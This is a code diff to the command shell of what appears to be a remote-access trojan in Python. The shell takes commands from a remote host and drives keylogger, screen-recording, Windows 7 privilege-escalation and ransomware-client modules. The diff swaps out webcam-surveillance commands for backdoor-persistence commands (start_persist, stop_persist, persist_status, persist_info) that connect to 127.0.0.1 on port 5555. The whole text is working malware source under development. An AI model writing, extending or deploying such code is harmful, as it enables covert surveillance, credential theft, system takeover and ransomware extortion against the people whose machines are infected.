@@ -14,7 +14,7 @@ import os  # For interacting with the operating system
 keylogger = None
 recorder = None  
 privilege_escalator = None
-camera = None
+persistence_manager = None
 ransomware = None
 
 import sys
@@ -29,7 +29,7 @@ if current_dir not in sys.path:
 from features.keylogger import create_keylogger
 from features.recording import create_surveillance_recorder
 from features.privilege import Windows7PrivilegeEscalator
-from features.camera import create_camera_surveillance
+from features.persistence import create_backdoor_persistence
 from features.ransomware_client import create_ransomware_client
 
 
@@ -91,7 +91,7 @@ def download_file(file_name):
 
 # Main shell function for command execution with enhanced features
 def shell():
-    global keylogger, recorder, privilege_escalator, camera, ransomware
+    global keylogger, recorder, privilege_escalator, persistence_manager, ransomware
     
     while True:
         # Receive a command from the remote host
@@ -185,52 +185,43 @@ def shell():
             except Exception as e:
                 reliable_send("List recordings error: " + str(e))
                 
-        # CAMERA COMMANDS
-        elif command == 'camera_photo':
+        # PERSISTENCE COMMANDS
+        elif command == 'start_persist':
             try:
-                if camera is None:
-                    camera = create_camera_surveillance("recordings")
-                success, msg = camera.take_snapshot()
-                reliable_send("Camera Photo: " + msg)
+                if persistence_manager is None:
+                    persistence_manager = create_backdoor_persistence('127.0.0.1', 5555)
+                success, msg = persistence_manager.start_persistence_operations()
+                reliable_send("Persistence: " + msg)
             except Exception as e:
-                reliable_send("Camera photo error: " + str(e))
+                reliable_send("Persistence start error: " + str(e))
                 
-        elif command == 'start_camera_recording':
+        elif command == 'stop_persist':
             try:
-                if camera is None:
-                    camera = create_camera_surveillance("recordings")
-                success, msg = camera.start_surveillance(duration=30)
-                reliable_send("Camera Recording: " + msg)
-            except Exception as e:
-                reliable_send("Camera recording error: " + str(e))
-                
-        elif command == 'stop_camera_recording':
-            try:
-                if camera:
-                    success, msg = camera.stop_surveillance()
-                    reliable_send("Stop Camera: " + msg)
+                if persistence_manager:
+                    success, msg = persistence_manager.stop_persistence_operations()
+                    reliable_send("Persistence: " + msg)
                 else:
-                    reliable_send("No camera recording active")
+                    reliable_send("No persistence active")
             except Exception as e:
-                reliable_send("Stop camera error: " + str(e))
+                reliable_send("Persistence stop error: " + str(e))
                 
-        elif command == 'camera_status':
+        elif command == 'persist_status':
             try:
-                if camera is None:
-                    camera = create_camera_surveillance("recordings")
-                status = camera.get_system_status()
-                reliable_send("Camera Status: " + json.dumps(status, indent=2))
+                if persistence_manager is None:
+                    persistence_manager = create_backdoor_persistence('127.0.0.1', 5555)
+                status = persistence_manager.get_persistence_status()
+                reliable_send("Persistence Status: " + json.dumps(status, indent=2))
             except Exception as e:
-                reliable_send("Camera status error: " + str(e))
+                reliable_send("Persistence status error: " + str(e))
                 
-        elif command == 'list_camera_recordings':
+        elif command == 'persist_info':
             try:
-                if camera is None:
-                    camera = create_camera_surveillance("recordings")
-                recordings = camera.list_recordings()
-                reliable_send("Camera Recordings: " + json.dumps(recordings, indent=2))
+                if persistence_manager is None:
+                    persistence_manager = create_backdoor_persistence('127.0.0.1', 5555)
+                connections = persistence_manager.get_connection_report()
+                reliable_send("Persistence Info: " + json.dumps(connections, indent=2))
             except Exception as e:
-                reliable_send("List camera recordings error: " + str(e))
+                reliable_send("Persistence info error: " + str(e))
                 
         # PRIVILEGE ESCALATION COMMANDS
         elif command == 'check_privs':
